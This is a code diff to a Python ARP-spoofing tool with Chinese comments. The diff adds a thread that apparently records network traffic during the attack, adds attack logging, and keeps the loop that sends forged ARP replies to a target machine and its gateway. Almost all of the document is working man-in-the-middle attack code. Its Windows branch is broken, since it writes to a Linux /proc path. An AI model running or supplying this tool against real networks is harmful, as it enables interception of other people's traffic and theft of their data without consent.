@@ -5,6 +5,32 @@ from optparse import OptionParser  # 导入命令行参数处理模块optparse
 import sys
 import os
 import platform
+import threading
+import recordinfo
+import logging
+
+
+logfile = "log/record.log"
+
+
+class RecordThreading (threading.Thread):
+    def __init__(self, interface, pause=5.):
+        super(RecordThreading, self).__init__()
+        self._pause = pause
+        self._stopping = False
+        self._interface = interface
+
+    def run(self):
+        try:
+            logging.info("start threading.")
+            recordinfo.recording(self._interface)
+            time.sleep(self._pause)
+        except BaseException as e:
+            logging.error(e)
+            sys.exit(0)
+
+    def stop(self):
+        self._stopping = True
 
 
 def main():
@@ -22,6 +48,12 @@ def main():
         interface = options.interface
         tip = options.targetip
         gip = options.gatewayip
+
+        # threading of record
+        recordThreading = RecordThreading(interface, 3)
+        recordThreading.start()
+
+        # spoof
         spoof(interface, tip, gip)  # 将参数传给spoof函数
     else:
         parser.print_help()  # 显示帮助
@@ -31,11 +63,12 @@ def main():
 def ipforwarding(forward=1):
     opsys = platform.system().lower()
     if 'darwin' in opsys:  # MAC_OS_X
-        os.system("sysctl -w net.inet.ip.forwarding=%d" % (forward))
+        os.system("sudo sysctl -w net.inet.ip.forwarding=%d" % (forward))
     elif 'windows' in opsys:  # WINDOWS
         os.system("echo %d > /proc/sys/net/ipv4/ip_forward" % (forward))
     else:
         os.system("echo %d > /proc/sys/net/ipv4/ip_forward" % (forward))
+
 
 def spoof(interface, tip, gip):  # 获取命令行的输入实现arp攻击
     localmac = get_if_hwaddr(interface)  # get_if_hwaddr获取本地网卡MAC地址
@@ -52,17 +85,23 @@ def spoof(interface, tip, gip):  # 获取命令行的输入实现arp攻击
             upcase = (lambda x: x.upper() if len(x) > 0 else x)
             print "\n\t*** Start 1 attack... ***"
             print "target: %s-%s\ngateway: %s-%s\nlocal mac:%s" % (
-                tip, upcase(str(tmac)), gip, upcase(
-                    str(gmac)), upcase(str(localmac)))
+                upcase(str(tmac)), tip, upcase(str(gmac)), gip, upcase(str(localmac)))
             sendp(ptarget, inter=2, iface=interface)
             print "[*] send arp reponse to target"
             sendp(pgateway, inter=2, iface=interface)
             # 不断发送arp响应包欺骗目标机器和网关，直到ctrl+c结束程序
             print "[*] send arp reponse to gateway"
-    except KeyboardInterrupt:
+    except KeyboardInterrupt as e:
         ipforwarding(0)
+        logging.error(e)
         sys.exit(0)
 
 
 if __name__ == '__main__':
+    logging.basicConfig(filename=logfile,
+                        filemode='a',
+                        format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
+                        datefmt='%H:%M:%S',
+                        level=logging.DEBUG)
+    logging.info("start arp attack...")
     main()
